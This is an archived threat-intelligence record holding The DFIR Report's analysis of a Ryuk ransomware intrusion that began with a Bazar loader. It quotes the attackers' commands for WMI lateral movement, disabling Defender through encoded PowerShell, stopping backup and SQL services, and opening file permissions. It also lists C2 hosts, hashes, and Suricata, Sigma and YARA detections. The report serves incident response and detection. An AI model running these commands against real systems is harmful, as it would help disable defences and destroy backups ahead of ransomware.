{
    "id": "f5071f2f-7892-46fa-94df-d41d35b261bc",
    "created_at": "2023-01-12T15:03:06.175466Z",
    "updated_at": "2025-03-27T02:09:18.510225Z",
    "deleted_at": null,
    "sha1_hash": "809c246d7815c2b71c3f739400295029e8fc78e5",
    "title": "2020-10-08 - Ryuk’s Return",
    "authors": "",
    "file_creation_date": "2022-05-28T18:02:36Z",
    "file_modification_date": "2022-05-28T18:02:36Z",
    "file_size": 1681034,
    "plain_text": "# Ryuk’s Return\n\n**thedfirreport.com/2020/10/08/ryuks-return/**\n\n### Intro\n\n\nOctober 8, 2020\n\n\n#### The Ryuk group went from an email to domain wide ransomware in 29 hours and asked for over $6 million to unlock our systems. They used tools such as Cobalt Strike, AdFind, WMI, vsftpd, PowerShell, PowerView, and Rubeus to accomplish their objective.\n\n Ryuk has been one of the most proficient ransomware gangs in the past few years, with the FBI claiming $61 million USD having been paid to the group as of February 2020. Earlier in the year, the group grew a little quiet, but that seems to have changed in the past few weeks, with incidents like what occurred at UHS hospitals.\n\n### Case Summary\n\n#### In this case, the actions began via a loader malware known as Bazar/Kegtap. Reports indicate an email delivery via malspam, which has been creeping up in volume over the month of September.\n\n From the initial execution of the payload, Bazar injects into various processes including explorer.exe and svchost.exe, as well as, spawning cmd.exe processes. The initial goal of this activity was to run discovery using built in Windows utilities like nltest, net group, and the 3rd party utility AdFind.\n\n\n-----\n\n#### After the initial discovery activity the Bazar malware stayed relatively quiet, until a second round of discovery the following day. Again, the same tools were employed in the second round of discovery, plus Rubeus. This time the discovery collection was exfiltrated via FTP to a server hosted in Russia. Next, the threat actor began to move laterally.\n\n It took a few attempts, using various methods, from remote WMI, to remote service execution with PowerShell, until finally landing on Cobalt Strike beacon executable files transferred over SMB to move around the environment. From here forward, the threat actors relied on a Cobalt Strike beacon running on a domain controller as their main operations point.\n\n After picking the most reliable method to move through the environment, the threat actor then proceeded to establish beacons across the enterprise. In preparation for their final objectives, they used PowerShell to disable Windows Defender in the environment.\n\n The server utilized for backups in the domain was targeted first for encryption, with some further preparation completed on the host. However, once the Ryuk ransom executable was transferred over SMB from their domain controller (DC) pivot, it only took one minute to execute it.\n\n At this point Ryuk was transferred to the rest of the hosts in the environment via SMB and executed through an RDP connection from the pivot domain controller. In total, the campaign lasted 29 hours–from initial execution of the Bazar, to domain wide ransomware. If a defender missed the first day of recon, they would have had a little over 3 hours to respond before being ransomed.\n\n The threat actors requested 600+ bitcoins, which have a market value of around 6+ million USD.\n\n## Timeline\n\n\n-----\n\n-----\n\n#### For a full breakdown of the technical details and threat actor tactics, techniques, and procedures continue into the MITRE ATT&CK breakdown.\n\n## MITRE ATT&CK\n\n### Initial Access\n\n#### Initial delivery was via email with a link to the Bazar/Kegtap backdoor loader. We downloaded and ran Document-Preview.exe, which connected to 5.182.210[.]145 over 443/https.\n\n### Execution\n\n#### Service execution was used several times to execute scripts and executables during lateral movement.\n\n WMI was used as well in an attempt to execute dlls laterally.\n```\nWMIC /node:\"DC.example.domain\" process call create \"rundll32 C:\\PerfLogs\\arti64.dll,\nStartW\"\n\n The threat actors also performed process injection.\n\n```\n\n-----\n\n### Defense Evasion\n\n#### Disabling Windows Defender.\n```\npowershell -nop -exec bypass -EncodedCommand\nSQBFAFgAIAAoAE4AZQB3AC0ATwBiAGoAZQBjAHQAIABOAGUAdAAuAFcAZQBiAGMAbABpAGUAbgB0ACkALgBEAG\n\n### Discovery\n\n#### Day 1\n\n AdFind and adf.bat were dropped and run minutes after Document-Preview.exe was executed. We’ve seen adf.bat numerous times and you can read more about it here. The batch file outputs information into the following text files.\n\n Nltest was used to check for Domain trusts\nnltest /domain_trusts /all_trusts\n\n```\n\n-----\n\n#### Net was used to show Domain Admins\n```\nnet group \"Domain admins\" /DOMAIN\n\n Ping was used to test if systems were up in the environment\nping hostname.domain.local\n\n Break down of the process tree of activity from the Bazar loader on day 1.\n\n```\n\n-----\n\n-----\n\n#### Day 2\n\n Afind was run again, and then the threat actor attempted to Kerberoast using Rubeus.\n\n After a few false starts during lateral movement failures, the threat actors performed some additional local system recon.\n```\nsysteminfo\nnltest /dclist:\nGet-NetSubnet\nGet-NetComputer -operatingsystem *server*\nInvoke-CheckLocalAdminAccess\nFind-LocalAdminAccess\n\n WMI was used to check for the current AntiVirus on numerous systems\nWMIC /Node:localhost /Namespace:\\\\\\\\root\\\\SecurityCenter2 Path AntiVirusProduct Get\ndisplayName /Format:List\nImport-Module ActiveDirectory; Get-ADComputer -Filter {enabled -eq $true} -properties\n*|select Name, DNSHostName, OperatingSystem, LastLogonDate | Export-CSV\nC:\\Users\\AllWindows.csv -NoTypeInformation -Encoding UTF8\n\n### Lateral Movement\n\n#### On day 1 the threat actors checked a domain controller for MS17-010 before continuing with more discovery. The system was not vulnerable to MS17-010\n\n```\n\n-----\n\n#### Lateral movement began around 28 hours after initial entry, using SMB to drop a Cobalt Strike Beacon on a domain controller. From there, the threat actor used WMIC to execute the beacon.\n```\nWMIC /node:\\\"DC.example.domain\\\" process call create \\\"rundll32\nC:\\\\PerfLogs\\\\arti64.dll, StartW\\\"\n\n This payload did not appear to run successfully, as shortly after the threat actors dropped an additional payload on the beachhead host, and then executed a service on the DC, after no command and control traffic was apparent.\n\n The decoded Powershell.\n\n Following this, the treat actors copied and executed a Cobalt Strike beacon executable and initiated it via a service on the domain controller.\n\n```\n\n-----\n\n#### At this point, C2 connections appear on the domain controller connecting to martahzz[.]com – 88.119.171[.]75 over 443/https.\n\n Backup systems were targeted for lateral movement using the SMB exe executed around one hour after the first lateral movement execution from the beachhead host.\n\n The threat actor was having issues running beacons on numerous systems, and on at least one of the systems, they mounted the drive remotely.\n```\nC:\\Windows\\system32\\cmd.exe /C dir \\\\Server\\c$\n\n### Command and Control\n\n#### Bazar:\n\n 5.182.210.145|443\n\n Certificate [ec:4c:07:b8:3b:6a:a0:bf:60:36:b7:f4:92:9e:83:81:0f:96:46:b0 ]\n\n Not Before 2020/09/21 05:24:24 UTC\n\n Not After 2021/09/21 05:24:24 UTC\n\n Issuer Org Global Security\n\n Subject Common example.com\n\n Subject Org Global Security\n\n Public Algorithm rsaEncryption\n\n JA3: 72a589da586844d7f0818ce684948eea\n\n JA3s: e35df3e00ca4ef31d42b34bebaa2f86e\n\n```\n\n-----\n\n#### Cobalt strike:\n\n 88.119.171.75|443\n\n Certificate [ee:92:91:6b:7e:31:85:22:65:eb:16:11:c4:8f:0a:75:c9:05:1d:4b ]\n\n Not Before 2020/09/29 08:18:03 UTC\n\n Not After 2021/09/29 08:18:03 UTC\n\n Issuer Org lol\n\n Subject Common martahzz.com\n\n Subject Org lol\n\n Public Algorithm rsaEncryption\n\n JA3 : a0e9f5d64349fb13191bc781f81f42e1\n\n JA3s: ae4edc6faf64d08308082ad26be60767\n\n 107.173.58.183|443\n\n Certificate [e2:13:2c:a4:29:ae:f3:fa:35:1f:e1:5b:2c:25:76:57:37:5b:dc:35 ]\n\n Not Before 2020/09/22 14:34:11 UTC\n\n Not After 2021/09/22 14:34:11 UTC\n\n Issuer Org lol\n\n Subject Common nomadfunclub.com\n\n Subject Org lol\n\n Public Algorithm rsaEncryption\n\n JA3: a0e9f5d64349fb13191bc781f81f42e1\n\n JA3s: ae4edc6faf64d08308082ad26be60767\n\n### Exfiltration\n\n#### Domain discovery (AdFind and Rubeus outputs) exfiltrated by vsftpd to 45.141.84[.]120.\n\n\n-----\n\n### Impact\n\n#### SMB was used to transfer the Ryuk executables. Then, RDP connections were made from the first compromised DC, and then, ransomware executed throughout the environment, starting with the Backup servers. On the backup server, prior to execution, the threat actors pulled up the wbadmin msc console.\n\n Commands ran prior to ransom execution:\n\n\n-----\n\n```\n C:\\Windows\\system32\\net1 stop \\ samss\\ /y\n\"C:\\Windows\\system32\\net1 stop \\\"\"veeamcatalogsvc\\\"\" /y\"\n\"C:\\Windows\\system32\\net1 stop \\\"\"veeamcloudsvc\\\"\" /y\"\n\"C:\\Windows\\system32\\net1 stop \\\"\"veeamdeploysvc\\\"\" /y\"\n\"C:\\Windows\\System32\\net.exe\\\"\" stop \\\"\"samss\\\"\" /y\"\n\"C:\\Windows\\System32\\net.exe\\\"\" stop \\\"\"veeamcatalogsvc\\\"\" /y\"\n\"C:\\Windows\\System32\\net.exe\\\"\" stop \\\"\"veeamcloudsvc\\\"\" /y\"\n\"C:\\Windows\\System32\\net.exe\\\"\" stop \\\"\"veeamdeploysvc\\\"\" /y\"\n\"C:\\Windows\\System32\\taskkill.exe\\\"\" /IM sqlbrowser.exe /F\"\n\"C:\\Windows\\System32\\taskkill.exe\\\"\" /IM sqlceip.exe /F\"\n\"C:\\Windows\\System32\\taskkill.exe\\\"\" /IM sqlservr.exe /F\"\n\"C:\\Windows\\System32\\taskkill.exe\\\"\" /IM sqlwriter.exe /F\"\n\"C:\\Windows\\System32\\taskkill.exe\\\"\" /IM veeam.backup.agent.configurationservice.exe\n/F\"\n\"C:\\Windows\\System32\\taskkill.exe\\\"\" /IM veeam.backup.brokerservice.exe /F\"\n\"C:\\Windows\\System32\\taskkill.exe\\\"\" /IM veeam.backup.catalogdataservice.exe /F\"\n\"C:\\Windows\\System32\\taskkill.exe\\\"\" /IM veeam.backup.cloudservice.exe /F\"\n\"C:\\Windows\\System32\\taskkill.exe\\\"\" /IM\nveeam.backup.externalinfrastructure.dbprovider.exe /F\"\n\"C:\\Windows\\System32\\taskkill.exe\\\"\" /IM veeam.backup.manager.exe /F\"\n\"C:\\Windows\\System32\\taskkill.exe\\\"\" /IM veeam.backup.mountservice.exe /F\"\n\"C:\\Windows\\System32\\taskkill.exe\\\"\" /IM veeam.backup.service.exe /F\"\n\"C:\\Windows\\System32\\taskkill.exe\\\"\" /IM veeam.backup.uiserver.exe /F\"\n\"C:\\Windows\\System32\\taskkill.exe\\\"\" /IM veeam.backup.wmiserver.exe /F\"\n\"C:\\Windows\\System32\\taskkill.exe\\\"\" /IM veeamdeploymentsvc.exe /F\"\n\"C:\\Windows\\System32\\taskkill.exe\\\"\" /IM veeamfilesysvsssvc.exe /F\"\n\"C:\\Windows\\System32\\taskkill.exe\\\"\" /IM veeam.guest.interaction.proxy.exe /F\"\n\"C:\\Windows\\System32\\taskkill.exe\\\"\" /IM veeamnfssvc.exe /F\"\n\"C:\\Windows\\System32\\taskkill.exe\\\"\" /IM veeamtransportsvc.exe /F\"\n\"C:\\Windows\\system32\\taskmgr.exe\\\"\" /4\"\n\"C:\\Windows\\system32\\wbem\\wmiprvse.exe -Embedding\"\n\"C:\\Windows\\system32\\wbem\\wmiprvse.exe -secured -Embedding\"\n\"icacls \\\"\"C:\\*\\\"\" /grant Everyone:F /T /C /Q\"\n\"icacls \\\"\"D:\\*\\\"\" /grant Everyone:F /T /C /Q\"\n\n```\n\n-----\n\n#### All systems were left with the following ransom note:\n\n The threat actors asked for more than $6 million but were willing to negotiate.\n\n Enjoy our report? Please consider donating $1 or more to the project using Patreon. Thank you for your support!\n\n We also have PCAPs, files, memory images, Kape and Redline packages available here.\n\n## IOCs\n\n#### https://otx.alienvault.com/pulse/5f7f039322d638212355d28a\n\n https://misppriv.circl.lu/events/view/79958\n\n### Network\n```\n5.182.210.145\n88.119.171.75\n107.173.58.183\n45.141.84.120\nnomadfunclub.com\nmartahzz.com\n.bazar\n\n File\n\n```\n\n-----\n\n```\nDocument Preview.exe\n40b17d4ca83f079cf6b2b09d7a7fd839\n090e82a47b32dc94d71d4c84a3a76d2480589b00\n85ef348d39610c1d5f58e2524c0e929ec815a9fbe1f5924cdef7a0c05e58e5ad\nc5af8f6ae345f453442a3bbe8189c42ad3c7d4d89231607f78a1b6f24173679e38ac08d26294f46de98358\n6144:HF5dJ89Rl3FtuK0cuVxtIIOxK6xOMjKBxMkUcYBMcoPRxDu3fXtjpamF:HFp4Rl36KNoxwxNmBWcYBhdl\nfx16_multi_for_crypt_x86.exe\nfc9f8bf3fcae4bf65150bff296b5e271\n308261d2539dba9814aa28c458970beb00cc2864\nf7998c8b083b31e8b0e8eaf197f6db65b100d44d94700e0780e81c7d54eefcf5\n4f60d3a0ca16242a3916675f93d16ee29f423d46deef81cad6da32c325d261cf204e94baf958383305dd3d\n3072:AWh32QAodpLae6PEd0YstWTWlbkPn3aT3TFw:Jh32QAod5ae6P9YstVr\narti64.dll\nfc646e042c545be6f7e5bdcb3ecf64c7\nb5cdf571944f889e4369329aa01376e2204c01f0\nf22449c01f8233ea7c85a49f2b6b5fedd304fca5c0e58176bafda9218873c2dd\n8ddc48f4c5db09fc60053554487708fa5226e253edb64ace9e6fa0c3ea370df1bfd8e994cab0822feac494\n6144:4MB168YZHFXFxaSjx9nDPAhgaa0rEAmrSWLeLITo0:4MB168UlraSzrAhY+EAwSp0\nP64.exe\n9ff18f7a19e06b602e19b9e0aca3ad84\nbcbb5bbc55b4f44397c34e9fca2017587e69219b\n9d8cbb2bf4801276de2143ccd64a7d0f66263809a90bea0b664282a15d121d9e\n157b06e75a3977e80866058111768508c643ccea681cf324d770865b3b1d354e233088b2391020f2e988f6\n6144:Y52fXQtuKHZg9i/uu3cJfWCcIzZzvvnpPWyxXf7uByC:YmQtuKHP/AJuKZvVWmicadf.bat\nadf.bat\nb94bb0ae5a8a029ba2fbb47d055e22bd\n035940bd120a72e2da1b6b7bb8b4efab46232761\nf6a377ba145a5503b5eb942d17645502eddf3a619d26a7b60df80a345917aaa2\na8e5b535711268a0b82988259fbedc0211e0e55b5bf2d16ddcc21dae82f0312e178faee1b39ebec7fba5db\n6:81ykqi23fVxJfke9Nm0Lal9c9Nmw+IFc9NQ0LbyqAc9NCR+KsEc9NamWM5c9Nm0e:KqZxiZlpBIG21sSmz8y\n\n## Detections\n\n### Network\n\n```\n\n-----\n\n```\nET INFO Observed DNS Query for EmerDNS_TLD (.bazar)\nETPRO POLICY Possibly Suspicious example.com SSL Cert\nET TROJAN ABUSE.CH SSL Blacklist Malicious SSL certificate detected (Dridex/Trickbot\nCnC)\nETPRO TROJAN Observed Malicious SSL Cert (Cobalt Strike CnC)\nFeodo Tracker: potential TrickBot CnC Traffic_detected\nET NETBIOS DCERPC SVCCTL - Remote Service Control Manager Access\nET POLICY SMB2 NT Create AndX Request For a DLL File - Possible Lateral Movement\nET POLICY SMB2 NT Create AndX Request For an Executable File\nET POLICY SMB2 NT Create AndX Request For an Executable File In a Temp Directory\nET POLICY RunDll Request Over SMB - Likely Lateral Movement\nGPL NETBIOS SMB-DS IPC$ share access\nET CNC Feodo Tracker Reported CnC Server TCP group 15\nET EXPLOIT Possible ETERNALBLUE Probe MS17-010 (Generic Flags)\nET EXPLOIT Possible ETERNALBLUE Probe MS17-010 (MSF style)\nET POLICY Command Shell Activity Over SMB - Possible Lateral Movement\n\n### Sigma\n\n#### https://github.com/Neo23x0/sigma/blob/master/rules/windows/process_creation/win_powers hell_suspicious_parameter_variation.yml\n\n https://github.com/Neo23x0/sigma/blob/82cae6d63c9c2f6d3e86c57e11497d86279b9f95/rule s/windows/process_creation/win_susp_wmi_execution.yml\n\n https://github.com/Neo23x0/sigma/blob/master/rules/windows/other/win_defender_disabled.y ml\n\n https://github.com/Neo23x0/sigma/blob/master/rules/windows/malware/win_mal_ryuk.yml\n\n https://github.com/Neo23x0/sigma/blob/master/rules/windows/powershell/powershell_shellco de_b64.yml\n\n https://github.com/Neo23x0/sigma/blob/master/rules/windows/process_creation/win_shadow _copies_deletion.yml\n\n https://github.com/Neo23x0/sigma/blob/master/rules/windows/process_creation/win_susp_n et_execution.yml\n\n https://github.com/Neo23x0/sigma/blob/master/rules/windows/process_creation/win_susp_w hoami.yml\n\n https://github.com/Neo23x0/sigma/blob/master/rules/windows/process_creation/win_susp_w mi_execution.yml\n\n https://github.com/Neo23x0/sigma/blob/master/rules/windows/process_creation/win_trust_di scovery.yml\n\n```\n\n-----\n\n#### https://github.com/Neo23x0/sigma/blob/master/rules/windows/process_creation/win_whoami _as_system.yml\n\n Detects AdFind usage from a past case:\n```\ntitle: AdFind Recon\ndescription: Threat Actor using AdFind for reconnaissance.\nauthor: The DFIR Report\ndate: 2019/8/2\nreferences:\n  - https://thedfirreport.com/2020/08/03/dridex-from-word-to-domain-dominance/\ntags:\n  - attack.remote_system_discovery\n  - attack.T1018\nlogsource:\n  category: process_creation\n  product: windows\ndetection:\n  selection_1:\n    CommandLine|contains:\n      - adfind -f objectcategory=computer\n  selection_2:\n    CommandLine|contains:\n      - adfind -gcb -sc trustdmp\n  condition: selection_1 or selection_2\nfalsepositives:\n  - Legitimate Administrator using tool for Active Directory querying\nlevel: medium\nstatus: experimental\n\n### Yara\n\n```\n\n-----\n\n```\n/\nYARA Rule Set\nAuthor: The DFIR Report\nDate: 2020-10-04\nIdentifier: exes\nReference: https://thedfirreport.com\n*/\n/* Rule Set ----------------------------------------------------------------- */\nimport \"pe\"\nrule ryuk_exes_P64 {\nmeta:\ndescription = \"exes - file P64.exe\"\nauthor = \"The DFIR Report\"\nreference = \"https://thedfirreport.com\"\ndate = \"2020-10-04\"\nhash1 = \"9d8cbb2bf4801276de2143ccd64a7d0f66263809a90bea0b664282a15d121d9e\"\nstrings:\n$s1 = \"MultiReco.exe\" fullword ascii\n$s2 = \"AppPolicyGetProcessTerminationMethod\" fullword ascii\n$s3 = \"B:\\\\x64\\\\cpp\\\\x64\\\\Release\\\\MultiReco.pdb\" fullword ascii\n$s4 = \"AppPolicyGetThreadInitializationType\" fullword ascii\n$s5 = \"`template-parameter-\" fullword ascii\n$s6 = \"Error initializing the common controls.\" fullword wide\n$s7 = \"Error reading data from the file.\" fullword wide\n$s8 = \"operator<=>\" fullword ascii\n$s9 = \"operator co_await\" fullword ascii\n$s10 = \"AppPolicyGetWindowingModel\" fullword ascii\n$s11 = \"AppPolicyGetShowDeveloperDiagnostic\" fullword ascii\n$s12 = \"noexcept\" fullword ascii\n$s13 = \"Error opening the file!\" fullword wide\n$s14 = \"Error creating the window\" fullword wide\n$s15 = \"Error creating new stroke collection.\" fullword wide\n$s16 = \"Failed connect to the recognition context's event source.\" fullword wide\n$s17 = \"api-ms-win-appmodel-runtime-l1-1-2\" fullword wide\n$s18 = \"Failed to add the strokes to the Ink object's custom stroke collection\"\nfullword wide\n$s19 = \"Failed to attach the stroke collection to the recognition context\" fullword\nwide\n$s20 = \"Error loading ink object from the file.\" fullword wide\ncondition:\nuint16(0) == 0x5a4d and filesize < 2000KB and\n( pe.imphash() == \"c30bbd53e939306589cfb6ee8f94434f\" and\npe.exports(\"SDqwsgrfTRRADQDSwatuHdfCxv\") or all of them )\n}\nrule ryuk_exes_arti64 {\nmeta:\ndescription = \"exes - file arti64.dll\"\nauthor = \"The DFIR Report\"\nreference = \"https://thedfirreport.com\"\ndate = \"2020-10-04\"\nhash1 = \"f22449c01f8233ea7c85a49f2b6b5fedd304fca5c0e58176bafda9218873c2dd\"\n\n```\n\n-----\n\n```\nstrings:\n$s1 = \"PluginSample.dll\" fullword ascii\n$s2 = \"B:\\\\x32\\\\dll\\\\x64\\\\Release\\\\PluginSample.pdb\" fullword ascii\n$s3 = \"AppPolicyGetProcessTerminationMethod\" fullword ascii\n$s4 = \"AcquireSamplePlugin::DisplayConfigureDialog\" fullword wide\n$s5 = \"AppPolicyGetThreadInitializationType\" fullword ascii\n$s6 = \"`template-parameter-\" fullword ascii\n$s7 = \"operator<=>\" fullword ascii\n$s8 = \"operator co_await\" fullword ascii\n$s9 = \"AppPolicyGetWindowingModel\" fullword ascii\n$s10 = \"Transfer Completed Successfully!\" fullword wide\n$s11 = \"AppPolicyGetShowDeveloperDiagnostic\" fullword ascii\n$s12 = \"noexcept\" fullword ascii\n$s13 = \"Read-Only Photo Acquire Plugin\" fullword wide\n$s14 = \"api-ms-win-appmodel-runtime-l1-1-2\" fullword wide\n$s15 = \"Software\\\\Microsoft\\\\Windows\\\\CurrentVersion\\\\Photo\nAcquisition\\\\Plugins\\\\%ws\" fullword wide\n$s16 = \"[email protected]@\" fullword ascii\n$s17 = \"CLSID\\\\%ws\\\\InprocServer32\" fullword wide\n$s18 = \"`generic-type-\" fullword ascii\n$s19 = \"e>_eUsEi+H<Cc%RZtSC7QIt*HvDb68Pj3\" fullword ascii\n$s20 = \"Default Plugin Text\" fullword wide\ncondition:\nuint16(0) == 0x5a4d and filesize < 2000KB and\n( pe.imphash() == \"0fd22f187f22ab4ec2eb55f91ccefa7a\" and ( pe.exports(\"StartW\") and\npe.exports(\"TREWDGGegrfgyetdfghfGFEWRDSFGSDgf\") ) or all of them )\n}\nrule ryuk_fx16_multi_for_crypt_x86 {\nmeta:\ndescription = \"exes - file fx16_multi_for_crypt_x86.exe\"\nauthor = \"The DFIR Report\"\nreference = \"https://thedfirreport.com\"\ndate = \"2020-10-04\"\nhash1 = \"f7998c8b083b31e8b0e8eaf197f6db65b100d44d94700e0780e81c7d54eefcf5\"\nstrings:\n$s1 =\n\"LuxIsnXwkvavqUaBlcqjWmmutckYHRjvSmOKvtRMwvSKnQMiJqUoYEcMzIANnFlVcyliOfiiaTsMnNWaNDDON\n ascii\n$s2 =\n\"TYthgQVhYkfpnSlftPAzcdzAqVSlhPTZHjIthwkQuhrUvkIDilbaqJbwDZbiXcgGuIDIhJeCGXdfluoqjoelR\n ascii\n$s3 =\n\"IEOffhhLBexvIlCbvoQaZljxwWNMTczTsCUzgDpMsHSPyQIttHUgFUPadSIhtBYFrQNAKZiSvJglfknwqRoUx\n ascii\n$s4 =\n\"fVHNcZJdHEkcoMdCUvMUMRzbsdjHdGdTFmIoZXWDQHBQNYzPNEiAjdsYtHBlIxyoWwSoDVwnfFTXxZGBUpseg\n ascii\n$s5 =\n\"cXuNyWQgbFQlughZovoZDwAHHWvWqeZlfFKFKfxwAmWWlHOpKoSdnbPehKrooTcWjrYuZJjVAYkxMVwuBLkaF\n ascii\n$s6 =\n\"sjDUCMurdFjEkVRmOZHRYtajSNmSgxfmnvUnJmJgDGGsqEOeCADepuzBzinLnjnAfiZWzVrWstXexwCczXQwT\n ascii\n$s7 =\n\n```\n\n-----\n\n```\n GgcaduyeETNVsnybynUUywlxcoamtRlealYeLGXbpXBDTEJYavXdJAryMLCsZKrffWnBgAdGhLxqrgRebcImI\n ascii\n$s8 = \"[email protected]`TJ\\\\vtGVyqa|P{YGow|%\" fullword ascii\n$s9 = \"`[email protected]]H`suAVER\\\\~l^sG\" fullword ascii\n$s10 = \"Picuovphv Bbsg!Es|rwojrarkkd Stryjfes x4.3\" fullword ascii\n$s11 =\n\"\\\"YIWKqFIIAtSmNnwAnddonItdsMfDKcuoHBBWdeTMCFrlJJEFJzRIlaHAxjdKiWQkAnlaGHbAlIk}*1}TqVz\n ascii\n$s12 = \"OhqMCeeltSHDtTWKtVLmEURx'kz y\\\"7\" fullword ascii\n$s13 = \"FrystFsgcteIaui\" fullword ascii\n$s14 =\n\"JJaZFfGMWkYZvWZVgeqjvEBRIOmpsPZnmqGtsbupUOlsQicTzEmJbveDkpsVrglajErQAxMvSxFydAdbEPwlB\n ascii\n$s15 =\n\"HiaqQCPQHIAFgVRMdAUUmtLWGbUVlQRcTWvjUBTLYpoEHeBDNWCMIlBrjIsSlNmHWUKjMFeEkPJkeGftHCUVK\n ascii\n$s16 = \"FrystDdswirfCqovf{vD\" fullword ascii\n$s17 =\n\"QvehbLauVGuTdFKhOKGSIwAgBxTFhkGiZRyBVMqFXKegVZQPPOQdrrZwuNewAYNzDiznmhdgyiovipThWdtgn\n ascii\n$s18 =\n\"nFDnFOWGPuHyRcKShALUFIaVlXXwURYhHjhnRpCOuupuuBaIKJDbcbeAjHlojxJHKLrkQMmVvLSiLbRUBFigs\n ascii\n$s19 =\n\"CtJHYQXcJSNgHqnKRdZhxKPMQvZYXQZsgrwtQStObwzMfbjjyaXlDNoxVclplvGxkoQlIKsSJZOVRJzlxaMrM\n ascii\n$s20 = \"`EwSCLyaEZUPQuJBXob\" fullword ascii\ncondition:\nuint16(0) == 0x5a4d and filesize < 400KB and\n( pe.imphash() == \"2ce62b0c0226079a88a01c701dbee7b9\" or 8 of them )\n}\nrule ryuk_Document_Preview {\nmeta:\ndescription = \"exes - file Document-Preview.exe\"\nauthor = \"The DFIR Report\"\nreference = \"https://thedfirreport.com\"\ndate = \"2020-10-04\"\nhash1 = \"85ef348d39610c1d5f58e2524c0e929ec815a9fbe1f5924cdef7a0c05e58e5ad\"\nstrings:\n$s1 = \"MultiReco.exe\" fullword ascii\n$s2 = \"AppPolicyGetProcessTerminationMethod\" fullword ascii\n$s3 = \"Error initializing the common controls.\" fullword wide\n$s4 = \"Error reading data from the file.\" fullword wide\n$s5 = \"operator<=>\" fullword ascii\n$s6 = \"operator co_await\" fullword ascii\n$s7 = \"Error opening the file!\" fullword wide\n$s8 = \"Error creating the window\" fullword wide\n$s9 = \"Error creating new stroke collection.\" fullword wide\n$s10 = \"Failed connect to the recognition context's event source.\" fullword wide\n$s11 = \"api-ms-win-appmodel-runtime-l1-1-2\" fullword wide\n$s12 = \"Failed to attach the stroke collection to the recognition context\" fullword\nwide\n$s13 = \"Failed to add the strokes to the Ink object's custom stroke collection\"\nfullword wide\n\n```\n\n-----\n\n```\n$s14 Error loading ink object from the file. fullword wide\n$s15 = \"You need to have at least one in order to run this sample.\" fullword wide\n$s16 = \"Failed to create a unique string id for the stroke collection\" fullword wide\n$s17 = \"Recognition has failed. No results will be stored in the stroke collection.\"\nfullword wide\n$s18 = \"*- *[Cv\" fullword ascii\n$s19 = \"ggDeA08\" fullword ascii\n$s20 = \"qtwmuy2\" fullword ascii\ncondition:\nuint16(0) == 0x5a4d and filesize < 1000KB and\n( pe.imphash() == \"274676f64ec63375a7825a17a44cba07\" and\npe.exports(\"SDqwsgrfTRRADQDSwatuHdfCxv\") or 8 of them )\n}\n\n#### If you have detections you would like to add to this section, please contact us and we will credit you.\n\n## MITRE\n\n#### User Execution – T1204\n Windows Management Instrumentation – T1047\n Service Execution – T1035\n Scripting – T1064\n PowerShell – T1086\n Rundll32 – T1085\n Process Injection – T1055\n Valid Accounts – T1078\n Disabling Security Tools – T1089\n Account Discovery – T1087\n Domain Trust Discovery – T1482\n Network Service Scanning – T1046\n Query Registry – T1012\n Remote System Discovery – T1018\n Security Software Discovery – T1063\n Remote Services – T1021\n Commonly Used Port – T1043\n Standard Application Layer Protocol – T1071\n Data Encrypted for Impact – T1486\n\n (internal case 1005)\n\n```\n\n-----",
    "language": "EN",
    "sources": [
        {
            "id": "05d7b179-7656-44d8-a74c-9ab34d3df3a2",
            "created_at": "2023-01-12T14:38:44.599904Z",
            "updated_at": "2023-01-12T14:38:44.599904Z",
            "deleted_at": null,
            "name": "VXUG",
            "url": "https://www.vx-underground.org",
            "description": "vx-underground Papers",
            "reports": null
        }
    ],
    "references": [
        "https://papers.vx-underground.org/papers/Malware Defense/Malware Analysis 2020/2020-10-08 - Ryuk’s Return.pdf"
    ],
    "report_names": [
        "2020-10-08 - Ryuk’s Return.pdf"
    ],
    "threat_actors": [
        {
            "id": "610a7295-3139-4f34-8cec-b3da40add480",
            "created_at": "2023-01-06T13:46:38.608142Z",
            "updated_at": "2025-03-27T02:00:02.87217Z",
            "deleted_at": null,
            "main_name": "Cobalt",
            "aliases": [
                "Cobalt Gang",
                "GOLD KINGSWOOD",
                "COBALT SPIDER",
                "G0080",
                "Mule Libra",
                "Cobalt Group"
            ],
            "source_name": "MISPGALAXY:Cobalt",
            "tools": [],
            "source_id": "MISPGALAXY",
            "reports": null
        }
    ],
    "ts_created_at": 1673535786,
    "ts_updated_at": 1743041358,
    "ts_creation_date": 1653760956,
    "ts_modification_date": 1653760956,
    "files": {
        "pdf": "https://archive.orkl.eu/809c246d7815c2b71c3f739400295029e8fc78e5.pdf",
        "text": "https://archive.orkl.eu/809c246d7815c2b71c3f739400295029e8fc78e5.txt",
        "img": "https://archive.orkl.eu/809c246d7815c2b71c3f739400295029e8fc78e5.jpg"
    }
}